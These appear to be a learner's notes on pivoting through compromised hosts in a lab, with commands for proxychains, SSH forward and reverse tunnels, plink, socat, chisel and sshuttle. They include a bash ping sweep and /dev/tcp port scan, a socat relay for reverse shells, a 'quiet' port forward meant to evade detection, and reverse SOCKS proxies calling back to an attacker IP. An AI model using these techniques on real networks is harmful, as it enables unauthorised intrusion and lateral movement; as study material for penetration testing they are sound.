## Pivioting

Two main methods to pivioting:

- Tunnelling/proxies: Creating a proxy type connection through a compromised machine and routing all traffic through the proxy into the targeted network. This can potentially also be tunnelled inside another protocol (e.g. SSH tunnelling), which can be useful for evading a basic Intrusion Detection System (IDS) or firewalls.

- Port Forwarding: Creating a connection between a local port and a single port on a target, via a compromised host.

Proxies/tunnelling is good when alot of traffic into a target network, i.e using nmap for further enumeration. While port forwarding is faster and more reliable. 

A note, using linux/unix systems to piviot from are easier than windows, the best being an outward facing linux web server. 

portfwd is a meterpreter command for port forwarding.   

## Enumeration with pivioting 

Five possible ways to enumerate a network through a compramised machine. These are written in order of preference.

1) Using material found on machine  

       using arp -a 
       checking /etc/hosts or C:\Windows\System32\drivers\etc\hosts 
       Reading /etc/resolv.conf (stores DNS entries on linux) using nmcli dev show (network manger command line interface) or ipconfig /all

2) Pre installed tools on host machine 
    
    nmap is sometimes installed on linux machines

3) Using statically compiled tools that are uploaded 

    Statically complied nmap.

4) Using scripting techniques 
    
    i.e bash/python

5) Using local tools through a proxy connection 

    Very slow.
    Cannot scan UDP ports through a TCP proxy etc. Unless nmap scripting engine.


### Livining off the land (related to material found on machine).

- Using installed functionality on machine (i.e shell functionality) to scan for other ips

~~~
for i in {1..255}; do (ping -c 1 10.200.192.${i} | grep "bytes from" &); done
~~~

Sends one ping as a backgroud job (so can send multiple pings) and searchs with grep for output.

This is increadably slow when using powershell so better on a windows machine to use statically complied scanners.

**NOTE** Sometimes pings can be blocked by firewalls (i.e windows boxes), however less of a problem when pivioting as firewalls tend to work against external targets rather than internal targets. 

Portscanning can also be done in a similar way but is extremely slow

~~~
for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
~~~

## Proxy for pivioting

When creating a proxy a port on our own attacking machine is opened which is linked to the compromised server, giving us access to the target network. It is a tunnel between a port on our machine to the target network. 

### Proxychains

Useful tool, but has drawbacks

- Slow
- Use static tools as much as possible and route traffic through proxychains only when required.

Command line tool which is used in front of regular commands

For example to proxy netcat:

~~~
proxychains nc ip
~~~

Proxychains doesn't need a port it reads it from a master config file at /etc/proxychains.conf. 

However proxychains has a hiearchiacal order when looking for proxychains.conf 

~~~
1) The current directory (i.e. ./proxychains.conf)
2) ~/.proxychains/proxychains.conf
3) /etc/proxychains.conf
~~~

so cp the proxychains.conf to current dir means it can easily be edited without having to change the original file.

Changing the conf file

This section is the interesting section

~~~
[ProxyList]
# add proxy here ...
# meanwhile
# defaults set to "tor"
socks4  127.0.0.1 9050
~~~

Change port 9050 to (arbitary) proxy port that isn't tor.

Also uncomment the following line if running an nmap command through the port or else it will cause it to crash.

~~~
# proxy_dns
~~~

Other things to consider with proxychains:

- Only can usee tcp scans (no udp, SYN or ICMP so use -Pn on nmap)
- Extremely slow

### Foxyproxy

Add a proxy on foxy proxy with a random port. SOCKS4 is good but sometimes stuff will need SOCKS5 Once activated, all of your browser traffic will be redirected through the chosen port. 

If the target network doesn't have internet access (like all TryHackMe boxes) then you will not be able to access the outside internet when the proxy is activated. 

Routing your general internet searches through a client's network is unwise anyway, so turning the proxy off (or using the routing features in FoxyProxy standard) for everything other than interaction with the target network is advised.

With the proxy activated, you can simply navigate to the target domain or IP in your browser and the proxy will take care of the rest!



## SSH tunneling/Port forwarding

Can create a forward and reverse connections to make SSH tunnels allowing for forward ports and /or create proxies.


### Forward connections

These create a local (forward) SSH tunnel from attacking machine when we have SSH access to the target, more common on UNIX hosts. 

Two ways to create a forward SSH tunnel using the SSH client -- port forwarding and creating a proxy. 

1) Port forwarding

- Accomplished using the -L flag on ssh command which creates a link to a local port.
- Example

~~~
ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN

-L creates link to a local port
-f backgrounds the shell immeidately
-N tells ssh that only a connection is needed, no commands to be excuted.
~~~

- In this example there is a webserver running on 172.16.0.10 and we have ssh access to 172.16.0.5. 
- This command creates a link to the server on 172.16.0.10 which we can access by navigating to port 8000 on our web browser.
- We have created a link between our port 80 on the victims machine and 8000 on our machine.
- Higher ports should be used as doesn't require sudo and also doesn't interfer with normal functioning.   


2) Proxies.

- Using the -D switch opens up a port on the attacking machine as a proxy to send data through into the protected network.
- Useful with proxychains

~~~
ssh -D 1337 user@17.16.0.5 -fN

-D opens up a port
-fN backgrounds the shell
~~~


### Reverse Connections

Reverse connections are very possible. Good if you have a shell with no ssh access. However has risks as you must access an attacking machine from the target.

Done by:

1) Generate a new set of SSH keys:

~~~
ssh-keygen
~~~   

2) Copy the content of the public key (.pub), then edit the ~~~ ~/.ssh/authorized_keys ~~~ 

3) On a new line paste into the public key

~~~
command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty
~~~

This makes sure the key can only used for port forwarding, disallowing the ability to gain a shell on your attacking machine.

4) Check that an SSH server on attacking machine is running

~~~
sudo systemctl status ssh
~~~

start SSH if not running

~~~
sudo systemctl start ssh
~~~

5) Transfer the private key over to the target box. **NOTE** make sure the to discard the key afterwards.

6) Connect on the attacking machine

~~~
ssh -R local_port:target_ip.10:target_port user@attacking_ip -i key_file -fN
~~~

7) On newer machines a reverse proxy can be created (equviliant on using -D)

~~~
ssh -R port username@attacking_ip -i keyfile -fN
~~~

This opens up a proxy allowing to redirect all of traffic through localhost port, into the target network.

8) To close connections

~~~
ps aux | grep ssh

sudo kill PID
~~~

## Plink

plink.exe is a windows version of the PuTTY SSH client. Is being replaced in windows by ssh, however windows machines are less likely to have ssh runing on them.

plink often needs to be transfered to the target then used to create a reverse connection.

```
cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
``` 
The ```cmd.exe /c echo y``` says that a non interactive shell is needed, without this warnings about the target not being connected to this host before appear. Keys generated from ssh-keygen cannot be used in the -i but have to be converted using puttygen 

```
puttygen $key_file -o output_key.ppk
```
The ppk key can be transfered to the windoes machine and used in exactly the same way as a reverse port fowarding tunnel.

plink is located on kali at ```/usr/share/windows-resources/binaries/plink.exe```

**note** plink goes out of date quickly download new ones regularly from ```https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html```

## Socat

Very good for port forwarding but rarely installed by default, so often need static binaries. Socat wcan port forward both linux and windows targets. It also makes a good relay, so if the target doesn't have direct connection back to the our machine then can use socat relay on another compromised machine that does have access back to our machine. Socat will listen out for reverse shell calls for example on the target machine and forwards them to our machine.

Socat joins things together, by creating links between machines, ports, port and files, ports  on a compromised server to our machine or from our attacking machine to the compromised machine inside the network.

### Reverse shell relay with socat.

Using socat to send a reverse shell call back to our machine by a relay (compromised machine). To do this:

1) set up a listener on attacking machine (netcat, pwncat) 
2) On compromised start socat to start relay. 

```
./socat tcp-l:$LISTENING_PORT tcp:$IP_from_attacking_machine:$ATTACKING_PORT &

tcp-1:8000 is used to create a IPv4 listener on port 8000
tcp:$IP_from_attacking_machine:$PORT connects back to to local IP on port

```

We can then create a reverse shell on compromised server and this calls back to the local machine through the relay.

### Port forward - easiest way

Open a listening port on the compromised server and redirect traffic to a target server.

```
./socat tcp-l:port,fork,reuseaddr, tcp:<ip of target server>:port &

fork is used to to put every connection into a new process
reuseaddr allows the port to stay open after a connection is made to it

reuseaddr and fork allow the same port to be used again 

```

We can then connect to port 33060 on a relay machine and have the connection directly relayed to the intended target.

Example compromised machine ip 172.16.0.5 target ip 172.16.0.10

```./socat tcp-l:33060,fork,reuseaddr, tcp:172.16.0.10:33060 &``` allows us to connect to port 33060 on 172.16.0.5 and have traffic directed to 172.16.0.10

### Port foward -quietly

The easy way described opens a port which can be detected by network scans. A more complex quiet way that doesn't open a port can used.

1) On attacking machine run ```socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &``` (this opens up port 8000 with fork and reuseaddr to allow more than one connection using this port foward, 8001, creates a local port relay).
2) On the compromised relay server execute ```./socat tcp:$ATTACKING_IP:8001 tcp:$INTENDED TARGET:&port,fork & ```

This creates a link between the intended target port (i.e port 80) to our local host.  

Example of this (our ip 10.50.73.2 target ip 172.16.0.10)
```
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr & (on our machine)
./socat tcp:$10.50.73.2:8001 tcp:172.16.0.10:80,fork & 
```

In this example we create a link between our port 8000 and targets 172.16.0.10:80:
- The request goes to 127.0.0.1:8000
- Socat forwards anything from port 8000 on our machine to port 8001
- Port 8001 is connected directly to the socat process on the compromised server (so all traffic from port 8001 goes to 80 on the intended target)
- The process is reversed when the target sends a response (traffic from port 80 goes to port 8001 on our machine then to 8000) 

Remeber to kill process after as it is a background job.

## Chisel

A golang tool to set up a tunnelled proxy/port forward through a compromised system despite whether there is ssh access or not. 

### Reverse SOCKS proxy

This connects back from a compromised server to our attacking machine.

```
on attacking machine

./chisel server -p $listening_port --reverse &

on compromised host

./chisel client attacking_ip:listen_port R:socks &

R prefix is to start a proxy on the compromised target running the client, rather than on the attacking machine running the server (for reverse)
```
### Forward SOCKS proxy.

Rarer than reverse proxies as more likely to caught by firewalls etc.

```
On compromised host

./chisel server -p LISTENING_PORT --socks5

On attacking machine TARGET_IP:LISTENING_PORT PROXY_PORT:socks

Proxy_port is the port opened  
```

**PROXY CHAINS REMINDER** Chisel uses SOCKS5 so this needs to be edited in the proxy list
```
[ProxyList]
# add proxy here ...
# meanwhile
# defaults set to "tor"
socks5  127.0.0.1 1080
```

### Remote Port Forward

A remote port forward is when we connect back from a compromised targets to create the forward.

```./chisel server -p LISTEN_PORT --reverse &``` on attacking machine

```/chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &``` on compromised target. Very similar to SSH.

An example 
IP of us 172.16.0.20
compromised server is 172.16.0.5
target port is 22 on 172.16.0.10.

```./chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22 &``` on compromised machine 

```./chisel server -p 1337 --reverse &``` on attacking machine.

We can then access 172.16.0.10:22 (via SSH) by navigating to 127.0.0.1:2222.

### Local port forward

Identical to to remote port forwarding just switched.

On compromised machine ```./chisel server -p LISTENING_PORT```

Connect to this on the attacking machine ```./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT```

## SSHUTTLE

Creates a tunnelled proxy simulating a VPN so all traffic is routed through the proxy. Everything sent through is encryipted.
However only works on **LINUX machines** with **python** installed. 

### How to use

Base command is ```sshuttle -r username@address subnet``` so
```sshuttle -r user@172.16.0.5 172.16.0.0/24``` and will then ask for password

The tool will sit passively in the background and forward relevant traffic into the traget network.

Can also use -N which attempts to determine the subnets automatically (not always successful).

If we have a targets id_rsa key as password then we can do this

```sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET```

**note** sometimes a clinet fatal error code will appear. This is because the compromised machine is part of the subnet so use -x to exclude/

```sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5```


## Privioting summary

- Emunerate
- Proxychains/Foxyproxy used to access a proxy created with one of the other tools
- SSH can create both port forwards and proxies
- plink.exe is an SSH clinet for windows allowing to create reverse SSH connections on windows
- Socat is a good optio for redirecting connections, can be used to create port forwards in a variety of differnt ways
- chisel does exactly the same as ssh but doesn't require 
- sshuttle is a great way to create a proxy but only works on unix machines.
